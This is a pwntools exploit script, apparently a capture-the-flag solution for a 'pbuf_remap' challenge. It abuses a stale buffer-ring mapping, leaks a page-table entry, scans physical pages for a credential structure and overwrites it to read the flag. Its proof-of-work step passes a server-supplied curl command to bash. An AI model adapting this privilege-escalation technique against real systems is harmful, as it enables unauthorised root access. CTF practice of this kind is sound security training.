#!/usr/bin/env python3
from pwn import *
import re
import subprocess


HOST = args.HOST or "pwn.v1t.site"
PORT = int(args.PORT or 31337)


def start():
    if args.LOCAL:
        return process(["./pbuf_remap"], cwd=".")
    io = remote(HOST, PORT)
    solve_pow(io)
    return io


def solve_pow(io):
    first = io.recvline(timeout=2)
    if first != b"proof of work:\n":
        io.unrecv(first)
        return

    cmd = io.recvline(timeout=2).decode().strip()
    if not cmd.startswith("curl "):
        raise RuntimeError(f"unexpected pow command: {cmd}")

    io.recvuntil(b"solution: ")
    solution = subprocess.check_output(["bash", "-lc", cmd], text=True).strip()
    io.sendline(solution.encode())


def send_cmd(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def register_ring(io, bgid=1, entries=512, flags=1):
    send_cmd(io, 1)
    io.sendlineafter(b"bgid: ", str(bgid).encode())
    io.sendlineafter(b"entries: ", str(entries).encode())
    io.sendlineafter(b"flags: ", str(flags).encode())
    return io.recvline().strip()


def map_ring(io, bgid=1):
    send_cmd(io, 2)
    io.sendlineafter(b"bgid: ", str(bgid).encode())
    line = io.recvline().strip()
    return int(line.split(b"=")[1])


def unregister_ring(io, bgid=1):
    send_cmd(io, 3)
    io.sendlineafter(b"bgid: ", str(bgid).encode())
    return io.recvline().strip()


def ring_add(io, map_id, idx, addr, length, bid, resv):
    send_cmd(io, 4)
    io.sendlineafter(b"map: ", str(map_id).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"addr: ", hex(addr).encode())
    io.sendlineafter(b"len: ", hex(length).encode())
    io.sendlineafter(b"bid: ", hex(bid).encode())
    io.sendlineafter(b"resv: ", hex(resv).encode())
    return io.recvline().strip()


def inspect_entry(io, map_id, idx):
    send_cmd(io, 5)
    io.sendlineafter(b"map: ", str(map_id).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    line = io.recvline().strip().decode()
    m = re.search(
        r"addr=0x([0-9a-f]+) len=0x([0-9a-f]+) bid=0x([0-9a-f]+) resv=0x([0-9a-f]+)",
        line,
    )
    if not m:
        raise ValueError(f"unexpected inspect output: {line}")
    return {
        "raw": line,
        "addr": int(m.group(1), 16),
        "len": int(m.group(2), 16),
        "bid": int(m.group(3), 16),
        "resv": int(m.group(4), 16),
    }


def create_mm(io):
    send_cmd(io, 6)
    line = io.recvline().strip()
    return int(line.split(b"=")[1])


def vm_write(io, vm_id, va, length, data):
    send_cmd(io, 9)
    io.sendlineafter(b"vm: ", str(vm_id).encode())
    io.sendlineafter(b"va: ", hex(va).encode())
    io.sendlineafter(b"len: ", hex(length).encode())
    io.sendlineafter(b"hex: ", data.hex().encode())
    return io.recvline().strip()


def vm_read(io, vm_id, va, length):
    send_cmd(io, 8)
    io.sendlineafter(b"vm: ", str(vm_id).encode())
    io.sendlineafter(b"va: ", hex(va).encode())
    io.sendlineafter(b"len: ", hex(length).encode())
    return io.recvline().strip().decode()


def open_flag(io):
    send_cmd(io, 10)
    return io.recvline(timeout=2).strip().decode()


def main():
    io = start()

    register_ring(io, bgid=1, entries=512, flags=1)
    map_id = map_ring(io, bgid=1)
    unregister_ring(io, bgid=1)
    vm_id = create_mm(io)

    stale = inspect_entry(io, map_id, 3)
    encoded_slot7 = stale["len"] | (stale["bid"] << 32) | (stale["resv"] << 48)

    # If we xor the stale slot7 PTE with (guess << 12), slot 0 maps to
    # (real_scratch_page xor guess). Varying guess walks every physical page.
    for guess in range(0x200):
        ring_add(io, map_id, 0, encoded_slot7 ^ (guess << 12), 0, 0, 0)
        leak = vm_read(io, vm_id, 0, 8)
        if leak.startswith("4352454476310000"):
            break
    else:
        raise RuntimeError("cred page not found")

    vm_write(io, vm_id, 0x8, 0x18, b"\x00" * 16 + b"\xff" * 8)

    flag = open_flag(io)
    print(flag)
    io.close()


if __name__ == "__main__":
    main()
